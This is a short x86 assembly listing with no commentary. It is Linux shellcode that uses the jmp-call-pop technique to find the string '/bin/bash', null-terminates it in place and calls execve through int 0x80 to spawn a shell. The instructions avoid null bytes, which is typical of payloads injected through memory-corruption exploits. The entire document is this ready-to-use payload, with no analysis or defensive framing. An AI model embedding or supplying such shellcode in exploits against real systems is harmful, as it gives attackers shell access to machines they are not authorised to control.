jmp want_bin_bash
got_bin_bash:
xor eax, eax
mov al, 0x0b
pop ebx
xor ecx, ecx
xor edx, edx
mov [ebx + 9], ah
int 0x80
want_bin_bash:
call got_bin_bash
.Ascii "/bin/bash@"